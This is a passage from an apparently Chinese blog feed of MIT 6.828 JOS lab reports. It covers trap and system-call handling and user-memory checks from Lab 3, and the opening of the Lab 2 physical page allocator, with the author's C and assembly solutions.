class="comment">// push ds and es and general registers</span></div><div class="line">push %ds</div><div class="line">push %es</div><div class="line">pushal</div><div class="line"></div><div class="line"><span class="comment">// load ds and es with GD_KD, for kernel stack locates in data</span></div><div class="line">mov $GD_KD, %ax</div><div class="line">mov %ax, %ds</div><div class="line">mov %ax, %es</div><div class="line"></div><div class="line"><span class="comment">// pass tf as an argument</span></div><div class="line">pushl %esp</div><div class="line"></div><div class="line"><span class="comment">// call trap and no need to return</span></div><div class="line">call trap</div><div class="line"></div><div class="line"><span class="comment">// In trap.c, trap_init():</span></div><div class="line"></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// declare of exception handler</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">divide_error_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug_exception_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">non_maskable_interrupt_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">breakpoint_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bounds_check_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_opcode_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">device_not_available_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_fault_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_tss_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">segment_not_present_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">stack_exception_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">general_protection_fault_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">pagefault_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">floating_point_error_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">alignment_check_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">machine_check_handler</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">simd_floating_point_error_handler</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="comment">// set up trap gate descriptor</span></div><div class="line">SETGATE(idt[T_DIVIDE],	 <span class="number">1</span>, GD_KT, divide_error_handler,           	   <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_DEBUG],    <span class="number">1</span>, GD_KT, debug_exception_handler,            <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_NMI],      <span class="number">1</span>, GD_KT, non_maskable_interrupt_handler,     <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_BRKPT],    <span class="number">1</span>, GD_KT, breakpoint_handler,                 <span class="number">3</span>);</div><div class="line">SETGATE(idt[T_OFLOW],    <span class="number">1</span>, GD_KT, overflow_handler,                   <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_BOUND],    <span class="number">1</span>, GD_KT, bounds_check_handler,               <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_ILLOP],    <span class="number">1</span>, GD_KT, invalid_opcode_handler,             <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_DEVICE],   <span class="number">1</span>, GD_KT, device_not_available_handler,       <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_DBLFLT],   <span class="number">1</span>, GD_KT, double_fault_handler,               <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_TSS],      <span class="number">1</span>, GD_KT, invalid_tss_handler,                <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_SEGNP],    <span class="number">1</span>, GD_KT, segment_not_present_handler,        <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_STACK],    <span class="number">1</span>, GD_KT, stack_exception_handler,            <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_GPFLT],    <span class="number">1</span>, GD_KT, general_protection_fault_handler,   <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_PGFLT],    <span class="number">1</span>, GD_KT, pagefault_handler,                  <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_FPERR],    <span class="number">1</span>, GD_KT, floating_point_error_handler,       <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_ALIGN],    <span class="number">1</span>, GD_KT, alignment_check_handler,            <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_MCHK],     <span class="number">1</span>, GD_KT, machine_check_handler,              <span class="number">0</span>);</div><div class="line">SETGATE(idt[T_SIMDERR],  <span class="number">1</span>, GD_KT, simd_floating_point_error_handler,  <span class="number">0</span>);</div></pre></td></tr></table></figure></p>
<p>问题1：<br>若是使用同一个处理程序，将无法限制调用错误处理程序的代码的特权级，也无法得知中断向量的值。</p>
<p>问题2：<br>仅有内核代码允许执行页错误处理程序，尽管调用了<code>int $14</code>，仍然因为保护机制而生成了中断向量13。如果内核允许<code>int $14</code>唤醒页错误处理程序，那么恶意的程序可以因此而随意触发缺页错误，导致系统无法正常工作。</p>
<h3 id="第二部分-Page-Faults-Breakpoints-Exceptions-and-System-Calls-页错误，断点异常和系统调用"><a href="#第二部分-Page-Faults-Breakpoints-Exceptions-and-System-Calls-页错误，断点异常和系统调用" class="headerlink" title="第二部分 Page Faults, Breakpoints Exceptions, and System Calls - 页错误，断点异常和系统调用"></a>第二部分 Page Faults, Breakpoints Exceptions, and System Calls - 页错误，断点异常和系统调用</h3><h4 id="处理页错误"><a href="#处理页错误" class="headerlink" title="处理页错误"></a>处理页错误</h4><p>页错误的中断向量号为14，是非常重要的异常。当处理器接收一个页错误时，会将引发页错误的线性地址存储在处理器控制寄存器<code>CR2</code>中。</p>
<p>练习5的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In trap_dispatch():</span></div><div class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</div><div class="line">    <span class="comment">// dispatch page fault exceptions</span></div><div class="line">    page_fault_handler(tf);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="断点异常"><a href="#断点异常" class="headerlink" title="断点异常"></a>断点异常</h4><p>断点异常的中断向量号为3，通常被调试器用作向程序代码中添加断点，原理是将程序中的某一条指令暂时改为1字节的<code>int3</code>的软中断指令。在JOS中，我们将大量使用这一异常来实现一个原始的伪系统调用，使得用户环境可以使用它来环境JOS内核监视器，可以把内核监视器看做一个原始的调试器。<br>用户模式的<code>panic</code>，就是通过显示panic消息后执行<code>int3</code>实现的。</p>
<p>练习6的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</div><div class="line">    <span class="comment">// dispatch breakpoint exceptions</span></div><div class="line">    monitor(tf);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>问题3：<br>若是用特权级0初始化断点异常的IDT，那么会触发通用保护错误，这是因为用户模式的代码无法执行特权级0（内核模式）的处理程序，需要用特权级3初始化断点异常的IDT，这样才能使得断点测试正确通过。</p>
<p>问题4：<br>这些措施都是为了保护内核和用户环境的相互独立，使得用户环境仅能在收到允许的情况下执行某些内核的代码，保证了恶意程序不会破坏内核，窃取数据。同时也能保证用户环境能从内核得到必要的功能支持。</p>
<h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>用户进程通过系统调用请求内核为它工作。当用户进程唤醒系统调用时，处理器进入内核模式，处理器和内核合作保存用户进程状态，内核执行合适的代码完成系统调用，并恢复至用户进程。系统调用的具体实现随平台不同而不同。</p>
<p>JOS内核使用<code>int $0x30</code>作为系统调用。需要建立相关的中断描述符，注意中断向量<code>0x30</code>不可能由硬件生成，毫无疑问应该允许用户执行对应的处理程序。</p>
<p>应用程序会将系统调用号和系统调用参数存入寄存器中。避免了内核访问用户环境栈或是指令流。系统调用号放在寄存器<code>%eax</code>中，最多五个参数分别被相应地放在寄存器<code>%edx</code>, <code>%ecx</code>, <code>%ebx</code>, <code>%edi</code>和<code>%esi</code>中。内核将返回值放在寄存器<code>%eax</code>中。唤醒系统调用的汇编代码已经提供为<code>lib/syscall.c</code>中的<code>syscall()</code>。</p>
<p>练习7中遇到的问题如下：</p>
<ul>
<li>syscall作为软中断不会压入错误码</li>
<li>调用syscall函数时应当使用保存的栈帧中的寄存器值而非实际的寄存器值，原因是在函数调用间某些寄存器的值会发生改变</li>
<li>练习7需要参考<code>lib/syscall.c</code>中得知参数的位置关系</li>
</ul>
<p>练习7的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In trapentry.S:</span></div><div class="line">TRAPHANDLER_NOEC(syscall_handler, T_SYSCALL)</div><div class="line"></div><div class="line"><span class="comment">// In trap.c, trap_init():</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall_handler</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line">SETGATE(idt[T_SYSCALL],  <span class="number">0</span>, GD_KT, syscall_handler,                    <span class="number">3</span>);</div><div class="line"></div><div class="line"><span class="comment">// In kern/syscall.c, syscall():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"></div><div class="line"><span class="comment">// panic("syscall not implemented");</span></div><div class="line"></div><div class="line"><span class="keyword">switch</span> (syscallno) &#123;</div><div class="line"><span class="keyword">case</span> SYS_cputs:</div><div class="line">    <span class="comment">// call sys_cputs</span></div><div class="line">    sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2);</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SYS_cgetc:</div><div class="line">    <span class="comment">// cll sys_cgetc</span></div><div class="line">    <span class="keyword">return</span> sys_cgetc();</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SYS_getenvid:</div><div class="line">    <span class="comment">// call sys_getenvid</span></div><div class="line">    <span class="keyword">return</span> sys_getenvid();</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SYS_env_destroy:</div><div class="line">    <span class="comment">// call sys_env_destroy</span></div><div class="line">    <span class="keyword">return</span> sys_env_destroy((<span class="keyword">envid_t</span>)a1);</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:</div><div class="line">    <span class="keyword">return</span> -E_INVAL;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// will not reach here</span></div><div class="line"><span class="keyword">return</span> -E_UNSPECIFIED;</div></pre></td></tr></table></figure></p>
<h4 id="用户模式启动"><a href="#用户模式启动" class="headerlink" title="用户模式启动"></a>用户模式启动</h4><p>一个用户在<code>lib/entry.S</code>的顶部开始运行，经过某些设置后，代码调用<code>lib/libmain.c</code>。你应当修改<code>libmain()</code>以初始化指向当前环境的<code>struct Env</code>指针<code>thisenv</code>（注意到<code>lib/entry.S</code>已经定义了指向你在第一部分映射的<code>UENVS</code>的<code>envs</code>）。</p>
<p><code>libmain()</code>然后调用<code>umain</code>，对于hello程序而言，位于<code>user/hello.c</code>中。在打印<code>hello, world</code>后，它尝试访问<code>thisenv-&gt;env_id</code>。这也是为什么hello程序会出现<code>fault</code>。</p>
<p>练习8中遇到的问题如下：</p>
<ul>
<li>可以使用宏<code>ENVX</code>从<code>envid</code>得到<code>env</code>在<code>envs</code>中的偏移量，而无需遍历整个<code>envs</code></li>
<li>Lab2中<code>pgdir_walk</code>未设置<code>PTE_U</code>导致访问时出现了页错误（仅有PTE项中设置<code>PTE_U</code>是不足的）。</li>
</ul>
<p>练习8的答案如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In libmain.c, libmain():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="comment">// get env id use system call and use ENVX to get index</span></div><div class="line">thisenv = envs + ENVX(sys_getenvid());</div></pre></td></tr></table></figure></p>
<h4 id="页错误和内存保护"><a href="#页错误和内存保护" class="headerlink" title="页错误和内存保护"></a>页错误和内存保护</h4><p>内存保护是操作系统的重要特性，保证了一个程序的错误不会毁坏内核或是其他的程序。<br>操作系统通常和硬件一起实现内存保护。操作系统负责告知硬件哪些虚拟地址是有效的、哪些是无效的。当一个程序试图去访问一个无效的地址或是一个没有权限的地址时，处理器在引起错误的指令处停止程序，然后带着相应的信息陷入内核。若错误可修复，则内核修复该错误并继续执行程序；若错误不可恢复，则程序无法继续运行。<br>现在考虑系统调用，系统调用允许用户程序向内核传递指针，内核在处理系统调用时将指针解引用，会出现以下两种问题：</p>
<ol>
<li>内核的缺页错误潜在地比用户程序的缺页更加严重。若内核在操作私有的数据结构时发生缺页，那么将是内核自己的漏洞，错误处理程序应当panic内核。然而当内核解引用用户程序传递的指针时，需要某种方式标记由解引用导致的缺页实际上代表的是用户程序的利益。</li>
<li>内核比用户程序具有更多的权限。在这种情况下，用户程序可能传递给内核一个指针，该指针指向的内存只能被内核读写而不能被用户程序读写。在这种情况下，内核不能对该指针解引用，这么做会暴露私有数据或是破坏内核完整性。</li>
</ol>
<p>当内核处理用户程序传递的指针时必须非常小心。内核必须检查用户传入的指针。</p>
<p>练习9和练习10遇到的问题如下</p>
<ul>
<li>需要获取段寄存器的最低两位以得到段特权级</li>
</ul>
<p>练习9和练习10的答案如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In kern/trap.c, page_fault_handler():</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// code that causes page fault in kernel mode</span></div><div class="line">    panic(<span class="string">"page fault in kernel!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In kern/pmap.c, user_mem_check():</span></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">user_mem_check</span><span class="params">(struct Env *env, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len, <span class="keyword">int</span> perm)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// LAB 3: Your code here.</span></div><div class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)va &gt;= ULIM) &#123;</div><div class="line">        <span class="comment">// condition 1 - below ULIM violated</span></div><div class="line">        user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va;</div><div class="line">        <span class="keyword">return</span> -E_FAULT;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">uintptr_t</span> va_start = (<span class="keyword">uintptr_t</span>)ROUNDDOWN(va, PGSIZE);</div><div class="line">    <span class="keyword">uintptr_t</span> va_end = (<span class="keyword">uintptr_t</span>)ROUNDUP(va + len, PGSIZE);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (; va_start &lt; va_end ; va_start += PGSIZE) &#123;</div><div class="line">        <span class="comment">// note we set page directory entry with less restrict</span></div><div class="line">        <span class="comment">// we will only test page table entry here</span></div><div class="line">        <span class="keyword">pte_t</span> * pgtable_entry_ptr = pgdir_walk(env-&gt;env_pgdir, (<span class="keyword">char</span> *)va_start, <span class="literal">false</span>);</div><div class="line">        <span class="keyword">if</span> ((*pgtable_entry_ptr &amp; (perm | PTE_P)) != (perm | PTE_P)) &#123;</div><div class="line">            <span class="comment">// condition 2 - permission violated</span></div><div class="line">            <span class="keyword">if</span> (va_start &lt;= (<span class="keyword">uintptr_t</span>)va) &#123;</div><div class="line">                <span class="comment">// va lie in the first page and not aligned, return va</span></div><div class="line">                user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va;</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (va_start &gt;= (<span class="keyword">uintptr_t</span>)va + len) &#123;</div><div class="line">                <span class="comment">// va lie in the last page and exceed va + len, return va + len</span></div><div class="line">                user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va + len;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// return corresponding page's initial address</span></div><div class="line">                user_mem_check_addr = va_start;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">return</span> -E_FAULT;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// pass user memory check</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In kern/syscall.c, syscall():</span></div><div class="line"><span class="keyword">case</span> SYS_cputs:</div><div class="line">    <span class="comment">// checks memory before use sys_cputs to dereference a1</span></div><div class="line">    user_mem_assert(curenv, (<span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2, PTE_U);</div><div class="line">    <span class="comment">// call sys_cputs</span></div><div class="line">    sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2);</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="comment">// In kern/kdebug.c, debuginfo_eip():</span></div><div class="line"><span class="comment">// Make sure this memory is valid.</span></div><div class="line"><span class="comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="keyword">if</span> (user_mem_check(curenv, usd, <span class="keyword">sizeof</span>(struct UserStabData *), PTE_U) &lt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Make sure the STABS and string table memory is valid.</span></div><div class="line"><span class="comment">// LAB 3: Your code here.</span></div><div class="line"><span class="keyword">if</span> ((user_mem_check(curenv, stabs, stab_end - stabs, PTE_U) &lt; <span class="number">0</span>) ||</div><div class="line">    (user_mem_check(curenv, stabstr, stabstr_end - stabstr, PTE_U) &lt; <span class="number">0</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发生了页错误的原因还要观察<code>memlayout.h</code>，在<code>USTACKTOP</code>上方有一个位于<code>0xeebff000</code>的<code>User Exception Stack</code>，该虚拟地址没有映射任何的物理页。而在<code>mon_backtrace</code>的最后，访问到了位于此处的虚拟地址，因而导致了一个不可处理的页错误。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Lab3 - User Environments需要实现基本的内核功能，使得一个受保护的用户环境（进程）可以运行。在本实验中，需要让内核设置数据结构以追踪用户环境，创建一个单用户环境，加载程序镜像并执行。此外，内核还需要能处理用户环境的系统调用以及
    
    </summary>
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="用户环境" scheme="http://blog.codedragon.tech/tags/%E7%94%A8%E6%88%B7%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.828操作系统工程Lab2-Memory Management实验报告</title>
    <link href="http://blog.codedragon.tech/2018/02/20/MIT6-828%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8BLab2-Memory-Management%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2018/02/20/MIT6-828操作系统工程Lab2-Memory-Management实验报告/</id>
    <published>2018-02-20T14:12:33.000Z</published>
    <updated>2018-02-26T06:10:58.120Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>寒假在家终于有时间继续处理上学期没有做完的Labs，虽然效率偏低但总不是完全没有进展。<br>Lab2 - Memory Management主要包括了操作系统的内存管理，具体来说可以分为两部分。第一部分需要编写内核的物理内存分配器（Physical memory allocator），这会允许内核分配和释放内存。第二部分需要修改JOS的代码去实现一个虚拟内存，将虚拟地址映射到物理内存中。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>根据实验官网的提示，我们依次切换到分支lab2并且合并分支lab1，在合并的过程中，没有发生冲突。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user% git checkout -b lab2 origin/lab2</div><div class="line">user% git merge lab1</div></pre></td></tr></table></figure>
<p>实验二包括如下的新文件：</p>
<ul>
<li>inc/memlayout.h 描述了虚拟地址空间的结构</li>
<li>kern/pmap.c 需要修改、添加代码以完成实验</li>
<li>kern/pmap.h 定义了PageInfo结构 用来管理物理页状态</li>
<li>kern/kclock.h</li>
<li>kern/kclock.c 操作电池供电的时钟以及CMOS RAM硬件</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-Physical-Page-Management-物理页管理"><a href="#第一部分-Physical-Page-Management-物理页管理" class="headerlink" title="第一部分 Physical Page Management - 物理页管理"></a>第一部分 Physical Page Management - 物理页管理</h3><p>操作系统必须追踪物理内存以得知哪些内存是空闲的，以及哪些内存是正在被使用的。JOS使用页粒度管理PC的物理内存以便利用MMU映射和保护每一片被分配的内存。</p>
<p>实验的第一部分需要完成一个物理页面分配器，该分配器维护了一个<code>struct PageInfo</code>的链表来追踪空闲的物理页面（也就是空闲链表），空闲链表我已经在CSAPP中有所了解，这里不再赘述。</p>
<p>具体来说，需要完成kern/pmap.c中实现以下的函数：</p>
<ul>
<li>boot_alloc()</li>
<li>mem_init() （完成直到check_page_free_list(1)为止）</li>
<li>page_init()</li>
<li>page_alloc()</li>
<li>page_free()</li>
</ul>
<p>完成后可以启动JOS去观察<code>check_page_free_list()</code>以及<code>check_page_alloc()</code>函数是否成功以检查编写的分配器的正确性。</p>
<p>第一部分的物理页面分配器总体来说难度不大，因为编写的分配器不像CSAPP中的malloc一样，需要处理空闲内存的合并以及拆分，分配器只需要以物理页面为固定的粒度管理所有的内存即可。</p>
<p>在实际的Linux系统中，内核使用Buddy System快速地管理内存。</p>
<p>练习1的代码如下，仅供参考:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// In boot_alloc():</span></div><div class="line"><span class="comment">// Allocate a chunk large enough to hold 'n' bytes, then update</span></div><div class="line"><span class="comment">// nextfree.  Make sure nextfree is kept aligned</span></div><div class="line"><span class="comment">// to a multiple of PGSIZE.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// LAB 2: Your code here.</span></div><div class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// return the address of next free page</span></div><div class="line">    <span class="keyword">return</span> nextfree;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// round up size to a multiple of PGSIZE</span></div><div class="line">    <span class="keyword">size_t</span> size = ROUNDUP(n, PGSIZE);</div><div class="line">    <span class="keyword">char</span> * addr = nextfree;</div><div class="line">    <span class="comment">// update address of next free page(still multiple of PGSIZE)</span></div><div class="line">    nextfree += size;</div><div class="line">    <span class="comment">// nextfree is a kernel virtual address, out out memory when it exceeds 4 MB</span></div><div class="line">	<span class="keyword">if</span> (nextfree &gt;= (<span class="keyword">char</span> *)KADDR(<span class="number">0x400000</span>)) &#123;</div><div class="line">        panic(<span class="string">"out of memory when booting!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// return address</span></div><div class="line">    <span class="keyword">return</span> addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// In mem_init():</span></div><div class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">// Allocate an array of npages 'struct PageInfo's and store it in 'pages'.</span></div><div class="line"><span class="comment">// The kernel uses this array to keep track of physical pages: for</span></div><div class="line"><span class="comment">// each physical page, there is a corresponding struct PageInfo in this</span></div><div class="line"><span class="comment">// array.  'npages' is the number of physical pages in memory.  Use memset</span></div><div class="line"><span class="comment">// to initialize all fields of each struct PageInfo to 0.</span></div><div class="line"><span class="comment">// Your code goes here:</span></div><div class="line"><span class="comment">// get size of pages</span></div><div class="line"><span class="keyword">uint32_t</span> pages_size = <span class="keyword">sizeof</span>(struct PageInfo) * npages;</div><div class="line"><span class="comment">// use boot_alloc to allocate memory</span></div><div class="line">pages = (struct PageInfo *) boot_alloc(pages_size);</div><div class="line"><span class="comment">// initialization</span></div><div class="line"><span class="built_in">memset</span>(pages, <span class="number">0</span>, pages_size);</div><div class="line"></div><div class="line"><span class="comment">// In page_init():</span></div><div class="line"><span class="keyword">size_t</span> i;</div><div class="line"></div><div class="line"><span class="comment">// initialize from page 1 to page npages_basemem - 1</span></div><div class="line"><span 